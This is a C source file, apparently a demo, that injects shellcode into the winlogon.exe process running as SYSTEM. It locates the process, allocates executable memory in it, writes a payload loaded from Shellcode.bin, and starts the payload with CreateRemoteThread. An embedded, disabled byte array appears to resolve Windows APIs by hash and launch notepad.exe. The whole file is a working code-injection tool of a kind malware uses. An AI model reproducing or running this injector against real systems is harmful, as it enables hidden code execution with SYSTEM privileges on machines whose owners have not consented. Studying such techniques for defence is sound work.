#include <windows.h>
///////////////////////
#include <TlHelp32.h>
//////////////////////
#include <shlwapi.h>
#include <stdint.h>
#include <stdio.h>

/// this example demostrate how to inject shellcode into winlogon.exe process
/// please note, you have to lanuch/debug this program as
/// administrator(winlogon.exe running as SYSTEM)

#define MAX_PATH_LEN 512
#define PE_FILE L"Shellcode.bin"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

void Inject(uint8_t* shellcode, int shellcode_len) {
  PROCESSENTRY32 entry = {0};
  entry.dwSize = sizeof(PROCESSENTRY32);

  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

  int pid = -1;
  if (Process32First(snapshot, &entry) == TRUE) {
    while (Process32Next(snapshot, &entry) == TRUE) {
      if (lstrcmpi(entry.szExeFile, L"winlogon.exe") == 0) {
        pid = entry.th32ProcessID;
        break;
      }
    }
  }
  CloseHandle(snapshot);

  if (pid < 0) {
    printf("can not find winlogon.exe process id\n");
    return;
  }
  printf("shellcode injecting...\n");

  HANDLE proc_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  if (proc_handle == NULL) {
    printf("can not open process, error: %d\n", GetLastError());
    return;
  }

  LPVOID virtual_mem_ptr =
      VirtualAllocEx(proc_handle, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT,
                     PAGE_EXECUTE_READWRITE);
  if (virtual_mem_ptr == NULL) {
    printf("can not alloc memory, error: %d\n", GetLastError());
    return;
  }
  if (!WriteProcessMemory(proc_handle, virtual_mem_ptr, shellcode,
                          shellcode_len, 0)) {
    printf("write to memory failed: %d\n", GetLastError());
    return;
  }

  DWORD thread_id = 0;
  HANDLE thread_handle = CreateRemoteThread(
      proc_handle, NULL, 0, (LPTHREAD_START_ROUTINE)virtual_mem_ptr, 0, 0,
      &thread_id);
  if (!thread_handle) {
    printf("CreateRemoteThread failed: %d\n", GetLastError());
    return;
  }

  printf("Thread Handle: 0x%p\n", thread_handle);
  printf("Thread ID: %d\n", thread_id);

  printf("===== Great success! =====\n");

  CloseHandle(thread_handle);
}

uint8_t* LoadBinaryFile(const wchar_t* filename, size_t* file_size) {
  HANDLE bin_file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (bin_file == INVALID_HANDLE_VALUE) {
    // Handle file open error
    return NULL;
  }

  LARGE_INTEGER file_size_;
  if (!GetFileSizeEx(bin_file, &file_size_)) {
    // Handle file size retrieval error
    CloseHandle(bin_file);
    return NULL;
  }
  *file_size = (size_t)file_size_.QuadPart;

  uint8_t* buffer = (uint8_t*)malloc(*file_size);
  if (!buffer) {
    // Handle memory allocation error
    CloseHandle(bin_file);
    return NULL;
  }

  DWORD byte_read;
  if (!ReadFile(bin_file, buffer, (DWORD)*file_size, &byte_read, NULL) ||
      byte_read != *file_size) {
    // Handle read error
    free(buffer);
    CloseHandle(bin_file);
    return NULL;
  }

  CloseHandle(bin_file);

  return buffer;
}

int main(int argc, char* argv[]) {
#if 0
  // the byte array can be copied from the output window after running the
  // `build PE` task which is defined in the tasks.json file.
  uint8_t shellcode[] = {
      0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
      0xe8, 0x2f, 0x01, 0x00, 0x00, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e,
      0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc9, 0xb8,
      0x05, 0x15, 0x00, 0x00, 0x48, 0x85, 0xd2, 0x45, 0x8a, 0x01, 0x75, 0x06,
      0x45, 0x84, 0xc0, 0x75, 0x16, 0xc3, 0x45, 0x89, 0xca, 0x41, 0x29, 0xca,
      0x49, 0x39, 0xd2, 0x73, 0x2a, 0x45, 0x84, 0xc0, 0x75, 0x05, 0x49, 0xff,
      0xc1, 0xeb, 0x0a, 0x41, 0x80, 0xf8, 0x60, 0x76, 0x04, 0x41, 0x83, 0xe8,
      0x20, 0x41, 0x89, 0xc2, 0x45, 0x0f, 0xb6, 0xc0, 0x49, 0xff, 0xc1, 0x41,
      0xc1, 0xe2, 0x05, 0x45, 0x01, 0xd0, 0x44, 0x01, 0xc0, 0xeb, 0xbd, 0xc3,
      0x90, 0x90, 0x90, 0x90, 0x57, 0x48, 0x89, 0xcf, 0x56, 0x53, 0x48, 0x83,
      0xec, 0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
      0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x20, 0x48, 0x89, 0xf3, 0x0f, 0xb7,
      0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x85, 0xff, 0xff, 0xff, 0x89,
      0xc0, 0x48, 0x39, 0xf8, 0x75, 0x06, 0x48, 0x8b, 0x43, 0x20, 0xeb, 0x11,
      0x48, 0x8b, 0x1b, 0x48, 0x85, 0xdb, 0x74, 0x05, 0x48, 0x39, 0xde, 0x75,
      0xd9, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f,
      0xc3, 0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xd6, 0x41, 0x55, 0x41, 0x54,
      0x55, 0x31, 0xed, 0x57, 0x56, 0x53, 0x48, 0x89, 0xcb, 0x48, 0x83, 0xec,
      0x28, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x08, 0x88, 0x00, 0x00, 0x00,
      0x48, 0x01, 0xcf, 0x44, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0x67, 0x1c, 0x44,
      0x8b, 0x6f, 0x24, 0x49, 0x01, 0xcf, 0x39, 0x6f, 0x18, 0x76, 0x31, 0x89,
      0xee, 0x31, 0xd2, 0x41, 0x8b, 0x0c, 0xb7, 0x48, 0x01, 0xd9, 0xe8, 0x15,
      0xff, 0xff, 0xff, 0x4c, 0x39, 0xf0, 0x75, 0x18, 0x48, 0x01, 0xf6, 0x48,
      0x01, 0xde, 0x42, 0x0f, 0xb7, 0x04, 0x2e, 0x48, 0x8d, 0x04, 0x83, 0x42,
      0x8b, 0x04, 0x20, 0x48, 0x01, 0xd8, 0xeb, 0x04, 0xff, 0xc5, 0xeb, 0xca,
      0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d,
      0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0x56, 0x48, 0x8d, 0x35,
      0xb8, 0x00, 0x00, 0x00, 0xb9, 0xf0, 0x1d, 0xd3, 0xad, 0x53, 0x48, 0x83,
      0xec, 0x28, 0xe8, 0x19, 0xff, 0xff, 0xff, 0xb9, 0x53, 0x17, 0xe6, 0x70,
      0x48, 0x89, 0xc3, 0xe8, 0x0c, 0xff, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x75,
      0x04, 0x31, 0xdb, 0xeb, 0x39, 0x48, 0x89, 0xd9, 0xba, 0xdb, 0x2f, 0x07,
      0xb7, 0xe8, 0x47, 0xff, 0xff, 0xff, 0x48, 0x89, 0xc3, 0xe8, 0x7e, 0x00,
      0x00, 0x00, 0x48, 0x8d, 0x0d, 0x47, 0x00, 0x00, 0x00, 0x48, 0x29, 0xf1,
      0x48, 0x01, 0xc1, 0xff, 0xd3, 0x48, 0x85, 0xc0, 0x74, 0xd3, 0xba, 0xca,
      0xa7, 0xf4, 0xcf, 0x48, 0x89, 0xc1, 0xe8, 0x1e, 0xff, 0xff, 0xff, 0x48,
      0x89, 0xc3, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x25, 0x00,
      0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x29, 0xf1, 0x48, 0x01, 0xc1,
      0x48, 0x89, 0xd8, 0x5b, 0x5e, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90,
      0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x6d, 0x73, 0x76, 0x63,
      0x72, 0x74, 0x00, 0x73, 0x74, 0x61, 0x72, 0x74, 0x20, 0x6e, 0x6f, 0x74,
      0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x00, 0x00, 0x00,
      0x00, 0x58, 0x48, 0x83, 0xe8, 0x05, 0xc3, 0x0f, 0x1f, 0x44, 0x00};

  Inject(shellcode, sizeof(shellcode));
#else
  // load from `Shellcode.bin` file
  TCHAR buffer[MAX_PATH_LEN] = {0};
  GetModuleFileName(NULL, buffer, MAX_PATH_LEN);
  PathRemoveFileSpec(buffer);

  wsprintf(buffer, L"%s\\%s", buffer, PE_FILE);
  wprintf(L"PE file path: %s\n", buffer);

  size_t file_size = 0;
  uint8_t* shellcode = LoadBinaryFile(buffer, &file_size);

  if (shellcode == NULL) {
    printf("load shellcode from file failed! exit program\n");
    return -1;
  }

  Inject(shellcode, file_size);
  free(shellcode);

#endif

  return 0;
}